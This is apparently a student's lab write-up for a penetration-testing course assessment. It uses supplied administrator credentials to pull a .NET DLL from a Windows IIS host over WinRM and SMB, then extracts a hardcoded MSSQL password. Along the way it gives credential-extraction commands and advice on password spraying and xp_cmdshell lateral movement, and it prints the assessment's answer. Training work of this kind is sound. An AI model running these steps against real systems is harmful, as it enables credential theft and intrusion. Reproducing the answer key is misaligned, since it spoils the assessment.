# Section 33 — Skills Assessment III (Module Finale)

**Scenario:** Team found a Windows host + Administrator creds. Task: connect and recover the **hardcoded MSSQL password** inside `MultimasterAPI.dll` (the .NET assembly from §28's "DLL File Examination").

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — hardcoded DB password in MultimasterAPI.dll | **`D3veL0pM3nT!`** |

Full connection string recovered:
```
server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
```

---

## 0 — Setup (edit per engagement)

```bash
export TARGET=10.129.100.146
export ADMIN='Administrator'
export PASS='xcyj8izxNVzhf4z'
```
> RDP creds were given, but RDP = GUI. With local-admin creds, **WinRM + SMB** do everything headless — no desktop needed.

---

## 1 — Validate access

```bash
# confirm admin over WinRM (Pwn3d! = local admin)
nxc winrm $TARGET -u "$ADMIN" -p "$PASS"
```
> `Pwn3d!` ⇒ full command execution via WinRM. Domain here = `MEGACORP.LOCAL`, host `MULTIMASTER` (Windows Server 2016).

---

## 2 — Locate the DLL

```bash
nxc winrm $TARGET -u "$ADMIN" -p "$PASS" -X 'Get-ChildItem C:\ -Recurse -Filter MultimasterAPI.dll -ErrorAction SilentlyContinue | Select -Expand FullName -First 1'
```
> Recursive search for the assembly. Found at **`C:\inetpub\wwwroot\bin\MultimasterAPI.dll`** (the API back-end of the IIS app). `inetpub\wwwroot\bin\` is always worth checking on IIS boxes — that's where ASP.NET compiled assemblies live.

---

## 3 — Pull it & extract the string (fast headless method)

```bash
# grab the DLL over SMB (admin has C$)
smbclient //$TARGET/C$ -U "$ADMIN%$PASS" -c 'get inetpub\wwwroot\bin\MultimasterAPI.dll /tmp/MultimasterAPI.dll'

# .NET string literals live in the #US stream as UTF-16LE -> strings -e l
strings -e l /tmp/MultimasterAPI.dll | grep -iE 'server=|data source|password|uid=|pwd=|database='
```
> **Key gotcha:** plain `strings` (ASCII) finds **nothing** — managed .NET string literals are stored **UTF-16 little-endian**. `strings -e l` (16-bit LE) dumps them. One line pops out:
> `server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;` → **password = `D3veL0pM3nT!`**.
> (Earlier attempt: splitting the byte stream on non-printables fragmented the literal and only surfaced type names like `SqlConnection` — don't pre-split, use `strings -e l`.)

---

## 4 — Alternative methods (taught / when strings is messy)

**A. dnSpy (the §28 taught path, GUI):** open `MultimasterAPI.dll` →
`MultimasterAPI.Controllers → ColleagueController` → the `SqlConnection(...)` literal holds the connection string. Best when the string is computed/obfuscated (then breakpoint after the build — see §21/§22).

**B. Decompile headless on Linux:**
```bash
# ilspycmd (dotnet tool) or monodis
ilspycmd /tmp/MultimasterAPI.dll | grep -iE 'server=|password|SqlConnection'
monodis --userstrings /tmp/MultimasterAPI.dll | grep -iE 'server=|password'
```
> `monodis --userstrings` dumps the #US heap directly — surgical for "find the hardcoded conn string" with zero decompilation.

**C. On-box, no exfil:**
```bash
nxc winrm $TARGET -u "$ADMIN" -p "$PASS" -X '[Text.Encoding]::Unicode.GetString([IO.File]::ReadAllBytes("C:\inetpub\wwwroot\bin\MultimasterAPI.dll")) -match "server=[^;]+;database=[^;]+;uid=[^;]+;password=[^;]+;"; $Matches[0]'
```
> Reads the DLL as UTF-16 and regex-matches the connection string in place — nothing leaves the host.

---

## 5 — Use the credential

```bash
# the recovered DB creds — test reuse (MSSQL, then spray)
mssqlclient.py 'finder:D3veL0pM3nT!'@$TARGET
nxc mssql $TARGET -u finder -p 'D3veL0pM3nT!' --local-auth
nxc smb $TARGET -u finder -p 'D3veL0pM3nT!'      # password reuse across services
```
> A hardcoded service password is rarely used only once — always reuse-test against MSSQL (`xp_cmdshell` → RCE), SMB, and other accounts. (On the real Multimaster box this kind of leak feeds the lateral-movement chain.)

---

## Exam / Engagement Notes

- **.NET assembly string hunting: `strings -e l` (UTF-16LE), not plain `strings`.** Managed string literals are in the `#US` metadata stream as 16-bit LE; ASCII strings shows none of them. `monodis --userstrings` / `ilspycmd` are the surgical alternatives; **dnSpy** for logic/obfuscation.
- **IIS boxes:** compiled app assemblies + connection strings live in `C:\inetpub\wwwroot\bin\` and `web.config` — check both.
- **Local-admin creds on Windows ⇒ go headless:** WinRM (`nxc -X`) for exec, SMB `C$` for file pull — skip RDP/GUI entirely.
- **Don't recall, verify:** connection-string passwords are instance-specific — pull and read the actual DLL (the §22 runtime-value rule). Here: `D3veL0pM3nT!`.
- **Always reuse-test recovered creds** (MSSQL `xp_cmdshell`, SMB, password spray) — the point of finding them is lateral movement.
- Ties back to: §28 (apps connecting to services / DLL examination), §21–§22 (thick-client / dnSpy / breakpoint-after-decrypt).

---

## Lab Walkthrough (quick steps)

```
1. nxc winrm $TARGET -u Administrator -p '<pass>'        -> Pwn3d!
2. nxc winrm ... -X 'gci C:\ -r -Filter MultimasterAPI.dll'
                                                          -> C:\inetpub\wwwroot\bin\MultimasterAPI.dll
3. smbclient //$TARGET/C$ -U 'Administrator%<pass>' -c 'get inetpub\wwwroot\bin\MultimasterAPI.dll'
4. strings -e l MultimasterAPI.dll | grep -i password
   -> server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
5. Q1 = D3veL0pM3nT!                                       ✅
```

> One line: admin creds → WinRM/SMB headless → pull the IIS `bin\` .NET DLL → `strings -e l` (UTF-16!) → hardcoded `password=D3veL0pM3nT!`.

---

## 🏁 Module Complete — Attacking Common Applications (33/33)

All sections documented in `06-REFERENCE_GUIDES/Attacking_Common_Applications/` (01–33). Recurring themes across the module: **discover → fingerprint exact version → known-CVE or built-in functionality → reuse creds for lateral movement.** Default passwords + built-in features did most of the work.
